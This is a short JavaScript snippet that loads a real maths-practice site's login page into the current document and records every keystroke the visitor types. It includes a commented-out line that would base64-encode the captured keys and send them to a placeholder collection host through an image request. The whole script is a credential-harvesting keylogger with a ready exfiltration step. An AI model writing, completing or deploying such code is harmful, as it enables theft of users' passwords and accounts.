(function() {
  const comfort = 'https://www.drfrostmaths.com/do-question.php?aaid=10972720'
  const bin = 'https://???/bin?data='

  const load = async path => document.write(
    await fetch(path)
    .then(r => r.text())
  )

  const log = data => {
    //new Image()
    //.src = `${bin}${btoa(JSON.stringify(data))}`
    console.log(`in data: ${data}`)
  }
  
  document.onkeydown = ({key}) => log(key)
  load(`/login.php?url=${encodeURIComponent(comfort)}`)
})()
